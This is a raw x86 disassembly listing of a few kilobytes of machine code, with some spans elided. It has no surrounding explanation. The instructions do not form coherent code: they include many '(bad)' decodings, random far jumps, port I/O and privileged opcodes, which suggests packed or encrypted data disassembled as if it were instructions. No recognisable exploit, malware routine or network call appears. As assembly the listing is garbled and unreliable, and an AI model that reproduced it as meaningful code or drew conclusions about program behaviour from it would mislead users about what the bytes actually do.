  41964f:	enter  0x58c,0x30
  419653:	xchg   ecx,eax
  419654:	mov    ecx,0xc8de47ef
  419659:	cmp    cl,dh
  41965b:	cmp    edx,DWORD PTR [edi]
  41965d:	dec    ebx
  41965e:	mov    al,0x9
  419660:	dec    ebp
  419661:	or     al,0x60
  419663:	push   esp
  419664:	cdq    
  419665:	gs and eax,0x50a88e1b
  41966b:	or     ch,dl
  41966d:	in     eax,0x97
  41966f:	xor    al,BYTE PTR [ecx-0x68]
  419672:	imul   edx,DWORD PTR [edi-0xd71b8a4],0x31
  419679:	xchg   edi,eax
  41967a:	adc    DWORD PTR [ebx],ebx
  41967c:	cmc    
  41967d:	xchg   ebp,eax
  41967e:	and    esp,DWORD PTR [ecx]
  419680:	pop    edx
  419681:	test   eax,0xb244d7d6
  419686:	xchg   esp,eax
  419687:	pop    esi
  419688:	fadd   QWORD PTR [edi+0x13]
  41968b:	data16 clc 
  41968d:	inc    edx
  41968e:	jb     0x419678
  419690:	jecxz  0x4196d9
  419692:	cld    
  419693:	gs call edx
  419696:	shl    BYTE PTR [ebp+0x350d0ffc],0x6a
  41969d:	mov    edi,DWORD PTR [ebx]
  41969f:	loop   0x41964a
  4196a1:	lds    eax,FWORD PTR [eax+0x47]
  4196a4:	sub    BYTE PTR [esp+ebp*4],bl
  4196a7:	xor    al,0xa8
  4196a9:	and    eax,0xb7ac8dd4
  4196ae:	sub    bh,bh
  4196b0:	sbb    DWORD PTR [ebp+0x2d],eax
  4196b3:	lods   eax,DWORD PTR ds:[esi]
  4196b4:	test   DWORD PTR [eax],0x0
	...
  419716:	mov    bl,0x3f
  419718:	jno    0x41977f
  41971a:	std    
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	mov    eax,ds:0x8a1e1aac
  419727:	or     eax,DWORD PTR [ecx]
  419729:	add    BYTE PTR [edi],al
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    BYTE PTR [esi],bh
  41972f:	call   DWORD PTR [esi]
  419731:	adc    BYTE PTR [edi],bl
  419733:	ret    0x400f
  419736:	add    eax,0xff209228
  41973b:	dec    ebx
  41973c:	cmp    al,0x2c
  41973e:	mov    al,0xb6
  419740:	jns    0x4196f1
  419742:	push   ds
  419743:	pop    ss
  419744:	add    dl,0x54
  419747:	dec    eax
  419748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419749:	das    
  41974a:	shl    DWORD PTR [eax],cl
  41974c:	adc    dh,BYTE PTR [esi+0x6245f32d]
  419752:	inc    DWORD PTR [ebx]
  419754:	pop    ebp
  419755:	mov    esi,0xda8b78e3
  41975a:	and    BYTE PTR [ebx-0x2fb48ff9],0xbf
  419761:	lea    esp,[esi+0x6d]
  419764:	cmc    
  419765:	xchg   DWORD PTR [ecx-0x69],ecx
  419768:	retf   
  419769:	push   ebp
  41976a:	push   0x6cbd165b
  41976f:	mov    esp,0xcb77cc9a
  419774:	fidivr WORD PTR [edx+ebx*4]
  419777:	xchg   edx,eax
  419778:	(bad)  
  41977a:	jmp    0x419702
  41977c:	mov    bl,0x38
  41977e:	mov    ecx,0x329e3b15
  419783:	mov    eax,ds:0x5e926be8
  419788:	sahf   
  419789:	fwait
  41978a:	cmp    BYTE PTR [ebx-0x6b544585],cl
  419790:	inc    ebp
  419791:	inc    esi
  419792:	mov    DWORD PTR [edx-0x2f6b6a93],esi
  419798:	and    al,0x12
  41979a:	xchg   ebp,eax
  41979b:	mov    DWORD PTR [edi-0x11eecb78],ecx
  4197a1:	sub    bl,BYTE PTR [eax+0x56]
  4197a4:	mov    al,0xa1
  4197a6:	mov    ebp,0xe0aec8e8
  4197ab:	xchg   BYTE PTR [ebx+0x33],ch
  4197ae:	(bad)  
  4197af:	pop    ebx
  4197b0:	lock cs sub eax,0x9743044e
  4197b7:	iret   
  4197b8:	loope  0x419761
  4197ba:	outs   dx,DWORD PTR ds:[esi]
  4197bb:	jg     0x41979c
  4197bd:	pop    ecx
  4197be:	xlat   BYTE PTR ds:[ebx]
  4197bf:	jmp    0xb295f1fd
  4197c4:	outs   dx,BYTE PTR ds:[esi]
  4197c5:	adc    dh,BYTE PTR [edx+ebx*2]
  4197c8:	je     0x419780
  4197ca:	mov    es,WORD PTR [ebx+eax*2]
  4197cd:	scas   al,BYTE PTR es:[edi]
  4197ce:	test   DWORD PTR [ecx+0x4e],eax
  4197d1:	call   0x1bf5:0x6b566ec2
  4197d8:	into   
  4197d9:	(bad)  
  4197da:	mov    ah,0xf6
  4197dc:	sbb    DWORD PTR [ebx-0x50cf878f],ebx
  4197e2:	lds    ecx,FWORD PTR [eax]
  4197e4:	xor    eax,0xd984a279
  4197e9:	inc    esi
  4197ea:	jmp    0x4197bb
  4197ec:	int    0xe4
  4197ee:	jmp    0x419777
  4197f0:	push   esp
  4197f1:	bound  esp,QWORD PTR [esi+esi*4]
  4197f4:	ss fxch st(7)
  4197f7:	(bad)  
  4197f8:	mov    ebp,0xda57be7e
  4197fd:	mov    ds:0x38fc49fb,al
  419802:	pushf  
  419803:	sbb    DWORD PTR es:[esi+0x45453bcf],edx
  41980a:	mov    DWORD PTR [esp+eax*1+0x2b],eax
  41980e:	mov    DWORD PTR [ebp-0x79],esp
  419811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419812:	les    edx,FWORD PTR [edi+0xd3dd9f]
  419818:	mov    BYTE PTR [ecx-0x352ada9b],dh
  41981e:	fwait
  41981f:	pop    esi
  419820:	mov    al,BYTE PTR [ebp+0x4bc134c0]
  419826:	adc    al,BYTE PTR [edx]
  419828:	fistp  DWORD PTR [ecx-0x64]
  41982b:	xchg   edi,eax
  41982c:	add    ebx,DWORD PTR [edx]
  41982e:	jmp    0x555e6139
  419833:	retf   0x10
	...
  419896:	sbb    BYTE PTR [ecx],0x47
  419899:	loope  0x41987a
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	fiadd  DWORD PTR [esi-0x4d]
  4198a4:	inc    edx
  4198a5:	call   0x42a53b
  4198aa:	pop    es
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    al,al
  4198af:	div    eax
  4198b1:	jmp    0xbea2:0x513bb289
  4198b8:	and    eax,0xf170ef90
  4198bd:	out    dx,eax
  4198be:	into   
  4198bf:	outs   dx,BYTE PTR ds:[esi]
  4198c0:	and    ah,BYTE PTR [edx+0x34]
  4198c3:	adc    ebp,DWORD PTR [edx+0x9]
  4198c6:	mov    ah,0x3a
  4198c8:	jmp    0xadef:0x6e0a28bf
  4198cf:	repz ror DWORD PTR [bp+di-0x4c34],cl
  4198d5:	dec    edi
  4198d6:	add    dl,0xe0
  4198d9:	repnz mov ds:0xed232880,al
  4198df:	or     edi,esi
  4198e1:	pop    eax
  4198e2:	jb     0x419875
  4198e4:	add    DWORD PTR [edi-0x48],ebx
  4198e7:	mov    BYTE PTR [eax+eax*2+0x43ebb6d5],bh
  4198ee:	pop    edi
  4198ef:	ret    
  4198f0:	add    DWORD PTR [eax],ebx
  4198f2:	stc    
  4198f3:	pop    es
  4198f4:	mov    al,ds:0x30f3ae9e
  4198f9:	adc    eax,0x7e2cd040
  4198fe:	ja     0x419888
  419900:	pop    ss
  419901:	sbb    al,0x35
  419903:	push   0xffffff94
  419905:	mov    eax,ds:0xce9393f0
  41990a:	scas   al,BYTE PTR es:[edi]
  41990b:	add    DWORD PTR [ecx],esp
  41990d:	shl    edx,0xdf
  419910:	cld    
  419911:	sbb    dl,BYTE PTR [edi-0x1c]
  419914:	outs   dx,BYTE PTR ds:[esi]
  419915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419916:	cmp    BYTE PTR [ecx+0x18],ch
  419919:	leave  
  41991a:	mov    bh,0x94
  41991c:	dec    edx
  41991d:	in     al,dx
  41991e:	push   es
  41991f:	mov    dl,0x14
  419921:	pop    ebx
  419922:	jmp    0x419942
  419924:	jge    0x41990b
  419926:	mov    edx,DWORD PTR ds:0xa42423e0
  41992c:	lea    edx,[eax+0x64]
  41992f:	jecxz  0x4198d4
  419931:	clc    
  419932:	jne    0x41991b
  419934:	adc    eax,0x54dc635c
  419939:	push   eax
  41993a:	adc    edi,ecx
  41993c:	cmp    BYTE PTR [edi+ebp*4-0x2c13dd6],dh
  419943:	rcr    DWORD PTR [ebp+0x25],1
  419946:	or     ebp,DWORD PTR [edi]
  419948:	addr16 das 
  41994a:	es push 0x8f20ee1f
  419950:	mov    ch,0x29
  419952:	mov    ebp,0xfa35902a
  419957:	rep lods eax,DWORD PTR ds:[esi]
  419959:	and    BYTE PTR [eax],dh
  41995b:	mov    esp,0x3957cc4f
  419960:	pop    ds
  419961:	push   ds
  419962:	mov    eax,ds:0x5fad158b
  419967:	mov    ds:0x4434dec6,eax
  41996c:	mov    dh,0xee
  41996e:	repnz pop edi
  419970:	mov    ?,WORD PTR ds:0x86fda52b
  419976:	push   edi
  419977:	mov    eax,0x46e82b09
  41997c:	dec    edx
  41997d:	and    eax,0x834a1e0
  419982:	add    esp,DWORD PTR [ecx+0x1c]
  419985:	jo     0x41999c
  419987:	out    dx,al
  419988:	ins    DWORD PTR es:[edi],dx
  419989:	and    cl,BYTE PTR [edi]
  41998b:	bound  esp,QWORD PTR [ebp-0x738b495d]
  419991:	pop    edi
  419992:	jp     0x419918
  419994:	add    esp,DWORD PTR [esi+0xfcab348]
  41999a:	fistp  DWORD PTR [eax-0x19f14464]
  4199a0:	enter  0xcf83,0xf
  4199a4:	sbb    cl,BYTE PTR [ebx+0x9]
  4199a7:	push   ecx
  4199a8:	push   ebp
  4199a9:	push   ecx
  4199aa:	add    edx,DWORD PTR [eax]
  4199ac:	cmp    eax,0xec9d1d81
  4199b1:	mov    ds:0x7189b6,al
	...
  419a16:	xor    esi,DWORD PTR [ecx]
  419a18:	xchg   ebx,eax
  419a19:	lds    edx,FWORD PTR [ebx+0x59f777e7]
  419a1f:	push   ss
  419a20:	mov    eax,ds:0xe971909
  419a25:	out    dx,al
  419a26:	cwde   
  419a27:	or     eax,0x1070001
  419a2c:	add    BYTE PTR [eax],al
  419a2e:	inc    eax
  419a2f:	lock lods eax,DWORD PTR ds:[esi]
  419a31:	outs   dx,DWORD PTR ds:[esi]
  419a32:	mov    ebx,0x83765f34
  419a37:	xchg   BYTE PTR [esi],dh
  419a39:	adc    DWORD PTR [edx+0x67],eax
  419a3c:	and    edx,DWORD PTR [eax-0x4ec4f32d]
  419a42:	ret    
  419a43:	icebp  
  419a44:	aas    
  419a45:	mov    dh,0xe4
  419a47:	cmp    DWORD PTR [ecx+ebp*8],eax
  419a4a:	std    
  419a4b:	sub    bh,BYTE PTR [esi+0x2d]
  419a4e:	sbb    al,BYTE PTR [ebp-0x4292c48a]
  419a54:	xchg   BYTE PTR [edx+eax*4],al
  419a57:	mov    edx,0x7c5b52ff
  419a5c:	add    BYTE PTR [esi],bl
  419a5e:	jmp    0x5b8697
  419a63:	out    dx,al
  419a64:	shl    dl,0x30
  419a67:	lea    esp,[esi+0x3b]
  419a6a:	imul   edx,DWORD PTR [ebx+0x7c],0xffffffe4
  419a6e:	cmp    ah,BYTE PTR [esi+0x737ca929]
  419a74:	pushf  
  419a75:	les    ecx,FWORD PTR [edx-0x19]
  419a78:	ss sbb dh,BYTE PTR fs:[edx-0x33ccc051]
  419a80:	push   ecx
  419a81:	adc    eax,0xf27661b3
  419a86:	push   0xd31ba64
  419a8b:	mov    edi,ebp
  419a8d:	test   eax,0xe0652fde
  419a92:	jns    0x419a71
  419a94:	inc    ecx
  419a95:	test   DWORD PTR ds:0xe80b6556,0xb50302ff
  419a9f:	push   0xda4eeec5
  419aa4:	or     BYTE PTR [edi+0x7f],dh
  419aa7:	in     eax,dx
  419aa8:	mov    ebp,0xfe29b785
  419aad:	mov    edi,0xd4e28729
  419ab2:	and    al,ch
  419ab4:	in     al,dx
  419ab5:	bound  ecx,QWORD PTR [edi+eax*1-0x496f43a2]
  419abc:	sti    
  419abd:	icebp  
  419abe:	in     al,dx
  419abf:	lea    ecx,[edi+0x56b502b6]
  419ac5:	pushf  
  419ac6:	call   0x81b0440b
  419acb:	js     0x419ad9
  419acd:	mov    bl,0xe9
  419acf:	dec    ebp
  419ad0:	mov    ch,0x3f
  419ad2:	sar    BYTE PTR [ebx+edx*2-0x49],0xf1
  419ad7:	sbb    esp,ebp
  419ad9:	mov    ebx,0x5bcef043
  419ade:	push   ds
  419adf:	stc    
  419ae0:	popa   
  419ae1:	jo     0x419b35
  419ae3:	ret    
  419ae4:	loop   0x419ae5
  419ae6:	cwde   
  419ae7:	out    dx,eax
  419ae8:	inc    eax
  419ae9:	xchg   ebp,eax
  419aea:	xchg   esi,eax
  419aeb:	inc    ebp
  419aec:	out    dx,eax
  419aed:	sbb    esi,ebx
  419aef:	add    ebx,0x5ea2c7e1
  419af5:	or     ebp,esi
  419af7:	cld    
  419af8:	mov    WORD PTR ds:0xb14fa7b4,gs
  419afe:	dec    edi
  419aff:	sbb    al,0xc1
  419b01:	in     al,dx
  419b02:	push   ebx
  419b03:	sti    
  419b04:	(bad)  
  419b05:	fmul   st,st(7)
  419b07:	push   ss
  419b08:	stos   BYTE PTR es:[edi],al
  419b09:	jnp    0x419b5c
  419b0b:	iret   
  419b0c:	mov    edi,0x28e39bc7
  419b11:	xchg   eax,ecx
  419b13:	add    dl,BYTE PTR [edx+edx*2+0x5ce7374f]
  419b1a:	cld    
  419b1b:	aas    
  419b1c:	fs dec ebp
  419b1e:	scas   al,BYTE PTR es:[edi]
  419b1f:	mov    bl,0x5b
  419b21:	fsub   DWORD PTR [eax+0x3c]
  419b24:	or     BYTE PTR [edi-0x67],ch
  419b27:	xchg   ebp,eax
  419b28:	jl     0x419ae6
  419b2a:	shl    ebp,0x97
  419b2d:	mov    ebp,0xc2c5e1d3
  419b32:	pop    edi
  419b33:	scas   eax,DWORD PTR es:[edi]
  419b34:	int3   
	...
  419b95:	add    BYTE PTR [edx-0x3c],cl
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	pop    esp
  419ba3:	jne    0x419bf0
  419ba5:	(bad)  
  419ba6:	lahf   
  419ba7:	push   cs
  419ba8:	add    DWORD PTR [eax],eax
  419baa:	pop    es
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    BYTE PTR [ebx+edi*2-0x10],bl
  419bb1:	mov    DWORD PTR ds:[edi+0x3ceacce6],0xc79f22fb
  419bbc:	iret   
  419bbd:	(bad)  
  419bbe:	xchg   esp,eax
  419bbf:	jp     0x419c32
  419bc1:	rcr    DWORD PTR [ecx*1-0x76e8ac70],cl
  419bc8:	fiadd  DWORD PTR [edx+0x4554a390]
  419bce:	je     0x419b70
  419bd0:	ss cmp al,0x89
  419bd3:	add    esi,esi
  419bd5:	imul   edx,ecx,0x20
  419bd8:	cmp    ebx,ebp
  419bda:	pop    ecx
  419bdb:	out    dx,eax
  419bdc:	cdq    
  419bdd:	sbb    eax,ebp
  419bdf:	sti    
  419be0:	and    ah,dh
  419be2:	xor    eax,edi
  419be4:	xlat   BYTE PTR ds:[ebx]
  419be5:	nop
  419be6:	fiadd  DWORD PTR [eax-0x2215244c]
  419bec:	fiadd  DWORD PTR [ecx]
  419bee:	xor    bl,bh
  419bf0:	pop    ds
  419bf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bf2:	mov    bh,0xf6
  419bf4:	lods   al,BYTE PTR ds:[esi]
  419bf5:	mov    bh,0x85
  419bf7:	stos   DWORD PTR es:[edi],eax
  419bf8:	xlat   BYTE PTR ds:[ebx]
  419bf9:	sbb    eax,0x5000ed73
  419bfe:	lds    ebp,FWORD PTR [eax+0x27]
  419c01:	inc    eax
  419c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c03:	or     BYTE PTR [esi+0x5f],dh
  419c06:	or     al,0x29
  419c08:	cmp    al,0x7
  419c0a:	or     ah,BYTE PTR [edx-0x61]
  419c0d:	dec    esi
  419c0e:	mov    bl,BYTE PTR [esi-0x355d9c61]
  419c14:	xchg   esp,eax
  419c15:	cmp    cl,BYTE PTR [esp+eiz*2-0x68b5e455]
  419c1c:	or     al,0x1e
  419c1e:	outs   dx,BYTE PTR ds:[esi]
  419c1f:	pop    es
  419c20:	cli    
  419c21:	sbb    DWORD PTR [esi+0x4a],0xffffff9b
  419c25:	jl     0x419bd4
  419c27:	mov    bl,0xa0
  419c29:	fisub  DWORD PTR [esi+0x29]
  419c2c:	rol    DWORD PTR [ebx],1
  419c2e:	jb     0x419c86
  419c30:	cmp    esp,DWORD PTR [eax+0x55]
  419c33:	xchg   esi,eax
  419c34:	mov    al,ds:0x82ce49fe
  419c39:	iret   
  419c3a:	pop    eax
  419c3b:	ret    0x60bc
  419c3e:	sub    cl,bh
  419c40:	jmp    0x833c4ec9
  419c45:	icebp  
  419c46:	(bad)  
  419c47:	out    dx,al
  419c48:	or     al,0x2a
  419c4a:	dec    edi
  419c4b:	imul   esi,DWORD PTR [eax],0x5945762
  419c51:	xchg   esp,eax
  419c52:	mov    ebx,0xf121bed0
  419c57:	mov    esi,0x1df019c7
  419c5c:	xchg   BYTE PTR [edx],bl
  419c5e:	cmp    eax,0xfc0f1101
  419c63:	jp     0x419c4c
  419c65:	mov    ah,0x1c
  419c67:	enter  0xfcee,0x99
  419c6b:	add    eax,0x6d6eea65
  419c70:	stc    
  419c71:	aam    0xfb
  419c73:	inc    edx
  419c74:	or     DWORD PTR ds:0xa9c795fe,esi
  419c7a:	int3   
  419c7b:	lods   eax,DWORD PTR ds:[esi]
  419c7c:	icebp  
  419c7d:	ret    0xf263
  419c80:	arpl   WORD PTR [edx+0x38],di
  419c83:	cmp    al,0xf2
  419c85:	scas   eax,DWORD PTR es:[edi]
  419c86:	jecxz  0x419cf5
  419c88:	repz ja 0x419c7c
  419c8b:	mov    ch,0x1
  419c8d:	mov    esi,0x59c1e4d9
  419c92:	or     BYTE PTR [eax+0x786deb81],cl
  419c98:	popf   
  419c99:	xor    DWORD PTR [esi+0x3d],eax
  419c9c:	cmp    esp,DWORD PTR ds:[edi-0x37]
  419ca0:	and    DWORD PTR [esi-0x32345142],edx
  419ca6:	jbe    0x419ca6
  419ca8:	jnp    0x419d0d
  419caa:	sub    BYTE PTR [esp+eiz*4-0x3],cl
  419cae:	or     esp,ebx
  419cb0:	push   cs
  419cb1:	out    0xca,eax
  419cb3:	imul   ecx,DWORD PTR [esi+0x0],0x0
	...
  419d13:	add    BYTE PTR [eax],al
  419d15:	add    al,dh
  419d17:	xchg   edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0x7b3b9c45
  419d24:	inc    ebp
  419d25:	and    DWORD PTR [esi+0x700010f],0xa4000001
  419d2f:	outs   dx,DWORD PTR ds:[esi]
  419d30:	aam    0x97
  419d32:	mov    eax,0x21ff8b2f
  419d37:	xchg   edi,eax
  419d38:	pop    edi
  419d39:	js     0x419d72
  419d3b:	push   ebp
  419d3c:	xor    ebx,DWORD PTR ds:[ebp+0x77f66ad2]
  419d43:	into   
  419d44:	scas   eax,DWORD PTR es:[edi]
  419d45:	inc    edx
  419d46:	repnz mov ds,WORD PTR cs:[esi-0x73]
  419d4b:	dec    esp
  419d4c:	adc    al,0x6f
  419d4e:	jne    0x419dcc
  419d50:	stos   DWORD PTR es:[edi],eax
  419d51:	adc    BYTE PTR [edi-0x7449de87],ah
  419d57:	push   ebx
  419d58:	xor    al,0x3e
  419d5a:	sub    BYTE PTR [eax-0x17],bl
  419d5d:	repnz adc al,BYTE PTR [esi+0x74a4907b]
  419d64:	int3   
  419d65:	push   ecx
  419d66:	xchg   edi,eax
  419d67:	enter  0x23a1,0xb4
  419d6b:	ficomp WORD PTR [ebx+esi*8]
  419d6e:	push   0x9
  419d70:	cdq    
  419d71:	fwait
  419d72:	sbb    DWORD PTR [ebx-0xf],0x42
  419d76:	jne    0x419d7a
  419d78:	loop   0x419d39
  419d7a:	pop    esi
  419d7b:	fstp   st(1)
  419d7d:	inc    ecx
  419d7e:	cmp    al,0xd0
  419d80:	outs   dx,BYTE PTR ds:[esi]
  419d81:	xor    al,0x49
  419d83:	popa   
  419d84:	or     eax,0xd28c7b98
  419d89:	adc    ebp,esi
  419d8b:	daa    
  419d8c:	dec    esi
  419d8d:	in     eax,dx
  419d8e:	jno    0x419dd1
  419d90:	or     al,0x87
  419d92:	and    DWORD PTR [edi],ebx
  419d94:	jecxz  0x419d5e
  419d96:	loop   0x419d45
  419d98:	adc    cl,BYTE PTR [edx+0x3e8c55fa]
  419d9e:	mov    bl,0x91
  419da0:	pop    ds
  419da1:	lds    eax,FWORD PTR [esi+edi*2]
  419da4:	mov    bl,0xcb
  419da6:	or     al,0x8b
  419da8:	push   ebx
  419da9:	push   ds
  419daa:	fldenv [edi]
  419dac:	or     al,0xf9
  419dae:	xor    dl,0xf3
  419db1:	jle    0x419dc8
  419db3:	sbb    bl,BYTE PTR [ecx-0x7f]
  419db6:	aam    0xa4
  419db8:	dec    edi
  419db9:	pop    esi
  419dba:	adc    BYTE PTR [eax+0x1a0a8779],ch
  419dc0:	(bad)  
  419dc1:	retf   0x4a44
  419dc4:	inc    edx
  419dc5:	inc    ebp
  419dc6:	repnz pop ss
  419dc8:	cs push 0x0
  419dcb:	rcl    WORD PTR [ecx-0x98bad7e],1
  419dd2:	arpl   WORD PTR [ebx+0x56],di
  419dd5:	sbb    BYTE PTR [edi-0x1d],bl
  419dd8:	enter  0x5c9c,0x55
  419ddc:	xchg   ecx,eax
  419ddd:	xchg   edx,eax
  419dde:	push   edx
  419ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419de0:	adc    al,0xf9
  419de2:	aam    0x1d
  419de4:	jnp    0x419dc0
  419de6:	jo     0x419e36
  419de8:	dec    esp
  419de9:	sub    dh,BYTE PTR [ebp+0x7608f459]
  419def:	data16 jg 0x419dde
  419df2:	xchg   dh,bh
  419df4:	rcl    edx,0x8b
  419df7:	ins    DWORD PTR es:[edi],dx
  419df8:	push   edi
  419df9:	leave  
  419dfa:	sbb    BYTE PTR gs:[ecx],0xa6
  419dfe:	jne    0x419e55
  419e00:	aas    
  419e01:	es fwait
  419e03:	push   ebx
  419e04:	enter  0x439d,0xd6
  419e08:	or     BYTE PTR [ecx],bh
  419e0a:	mov    esp,0x5d9ecd93
  419e0f:	sbb    DWORD PTR [esi+0x28],esp
  419e12:	add    eax,0xde83ec8f
  419e17:	jl     0x419e81
  419e19:	add    eax,0xfbc8d9f4
  419e1e:	xor    ah,ah
  419e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e21:	adc    al,0x62
  419e23:	mov    DWORD PTR [esi],ecx
  419e25:	imul   ecx,DWORD PTR [edx+0x8],0xfffffff6
  419e29:	cmc    
  419e2a:	test   ecx,0x173d819c
  419e30:	pushf  
  419e31:	call   0x0:0x271e85
	...
  419e94:	add    BYTE PTR [eax],al
  419e96:	xchg   eax,ebx
  419e98:	pop    ss
  419e99:	lds    ebx,FWORD PTR [edi-0x31]
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax+0x3c50c5a0]
  419ea3:	xor    al,0xd9
  419ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ea6:	lods   eax,DWORD PTR ds:[esi]
  419ea7:	adc    BYTE PTR [ecx],al
  419ea9:	add    BYTE PTR [edi],al
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    BYTE PTR [esi-0x76],bl
  419eb0:	popa   
  419eb1:	sbb    ebp,DWORD PTR [ecx]
  419eb3:	fwait
  419eb4:	xchg   ecx,eax
  419eb5:	(bad)  
  419eb6:	loope  0x419e8f
  419eb8:	lahf   
  419eb9:	icebp  
  419eba:	jmp    0x2327dda3
  419ebf:	inc    edi
  419ec0:	mov    dh,0xa2
  419ec2:	pop    ds
  419ec3:	xchg   edi,eax
  419ec4:	ins    BYTE PTR es:[edi],dx
  419ec5:	leave  
  419ec6:	test   DWORD PTR [edx+0x3e],esp
  419ec9:	push   0x76469fbc
  419ece:	jnp    0x419e5c
  419ed0:	icebp  
  419ed1:	or     DWORD PTR [ebx+0x1a],0xe7cc333d
  419ed8:	fidiv  WORD PTR [edi+0x1c299081]
  419ede:	push   esp
  419edf:	sbb    esp,esi
  419ee1:	xchg   esi,eax
  419ee2:	pop    edi
  419ee3:	lds    esp,FWORD PTR ds:0xc5ee9a29
  419ee9:	jecxz  0x419e7f
  419eeb:	pop    ds
  419eec:	or     eax,0x642ee521
  419ef1:	mov    dh,0x99
  419ef3:	sbb    esp,DWORD PTR [esp+eax*2+0x5c]
  419ef7:	(bad)  
  419ef8:	pop    ds
  419ef9:	adc    al,0xec
  419efb:	pop    ebp
  419efc:	das    
  419efd:	add    al,0x36
  419eff:	fild   DWORD PTR [esi]
  419f01:	imul   edi,DWORD PTR [edi],0x87fb3ac9
  419f07:	and    eax,DWORD PTR [esi-0x82836b7]
  419f0d:	bound  ebp,QWORD PTR [edx]
  419f0f:	lds    edx,FWORD PTR [ebx-0x41]
  419f12:	out    dx,al
  419f13:	jnp    0x419f6e
  419f15:	xor    ebp,ebp
  419f17:	ror    ecx,0x71
  419f1a:	call   0x705370c0
  419f1f:	std    
  419f20:	adc    eax,0x9c3657c4
  419f25:	mov    esp,0x3a1be831
  419f2a:	mov    eax,0x763b676b
  419f2f:	aas    
  419f30:	cld    
  419f31:	or     ah,BYTE PTR [ebx+0x26578092]
  419f37:	or     al,ch
  419f39:	outs   dx,DWORD PTR ds:[esi]
  419f3a:	mov    esp,0x38bda9db
  419f3f:	push   ebx
  419f40:	xor    WORD PTR [edx-0x785742c8],bp
  419f47:	pop    ss
  419f48:	(bad)  
  419f4a:	adc    esp,edx
  419f4c:	mov    bl,0xf7
  419f4e:	(bad)  [edx-0x6d]
  419f51:	xchg   DWORD PTR ss:[eax+edi*1-0x1687de19],edx
  419f59:	lods   eax,DWORD PTR ds:[esi]
  419f5a:	int    0x89
  419f5c:	jecxz  0x419fdb
  419f5e:	xor    dh,0x1
  419f61:	push   ebx
  419f62:	cmp    ah,BYTE PTR [edx+edi*2-0x41]
  419f66:	nop
  419f67:	xor    al,0x99
  419f69:	inc    esp
  419f6a:	lea    ecx,[ebx]
  419f6c:	ins    DWORD PTR es:[edi],dx
  419f6d:	sbb    al,0x4f
  419f6f:	inc    ecx
  419f70:	pop    ss
  419f71:	sbb    al,0x4b
  419f73:	cdq    
  419f74:	aaa    
  419f75:	xchg   BYTE PTR [esi-0x6d1b64c9],dh
  419f7b:	js     0x419faa
  419f7d:	lods   eax,DWORD PTR ds:[esi]
  419f7e:	sub    eax,0xbbe3e11e
  419f83:	sub    ch,dh
  419f85:	addr16 in al,dx
  419f87:	xchg   edx,eax
  419f88:	std    
  419f89:	ret    
  419f8a:	xlat   BYTE PTR ds:[ebx]
  419f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f8c:	add    BYTE PTR [esi-0x1cff6a8d],bh
  419f92:	dec    edx
  419f93:	pop    esi
  419f94:	push   edx
  419f95:	jp     0x419f9d
  419f97:	xchg   edi,eax
  419f98:	test   al,0x2
  419f9a:	(bad)  
  419f9b:	(bad)  
  419f9c:	and    BYTE PTR [ebx],ch
  419f9e:	aad    0xd5
  419fa0:	push   0x3b242d87
  419fa5:	nop
  419fa6:	add    esp,DWORD PTR [edi-0x2262104c]
  419fac:	xchg   esp,eax
  419fad:	mov    ebx,0x81de15dc
  419fb2:	jle    0x419fae
  419fb4:	retf   0x0
	...
  41a013:	add    BYTE PTR [eax],al
  41a015:	add    BYTE PTR [esi-0x15],cl
  41a018:	sub    cl,BYTE PTR [esi-0x51]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	inc    ebp
  41a023:	or     ch,dh
  41a025:	js     0x419fdb
  41a027:	adc    DWORD PTR [ecx],eax
  41a029:	add    BYTE PTR [edi],al
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    BYTE PTR [ecx],al
  41a02f:	mov    bh,0x4b
  41a031:	inc    edx
  41a032:	addr16 cmp edi,esp
  41a035:	pop    edi
  41a036:	test   edi,esp
  41a038:	jg     0x41a04b
  41a03a:	mov    dh,0x93
  41a03c:	push   ds
  41a03d:	cmp    eax,0x40a5a8dc
  41a042:	aam    0x45
  41a044:	js     0x41a005
  41a046:	jmp    0x1cb8b298
  41a04b:	pusha  
  41a04c:	jmp    0x419fee
  41a04e:	jns    0x41a021
  41a050:	shl    ch,cl
  41a052:	cld    
  41a053:	jbe    0x419fe4
  41a055:	sbb    eax,0xf789e572
  41a05a:	les    ebp,FWORD PTR [edx]
  41a05c:	jge    0x41a014
  41a05e:	sub    al,0x2c
  41a060:	adc    dh,BYTE PTR [eax+0x72]
  41a063:	out    dx,al
  41a064:	jb     0x41a0df
  41a066:	clc    
  41a067:	xor    eax,0x78a7b755
  41a06c:	aad    0xf4
  41a06e:	mov    al,0xc0
  41a070:	es inc edx
  41a072:	int3   
  41a073:	and    al,0xb
  41a075:	cmp    ebp,DWORD PTR [ebx+ecx*1+0x5]
  41a079:	jmp    0x91f5:0x77649974
  41a080:	into   
  41a081:	pop    ecx
  41a083:	xor    dx,sp
  41a086:	in     al,dx
  41a087:	lahf   
  41a088:	pop    ebx
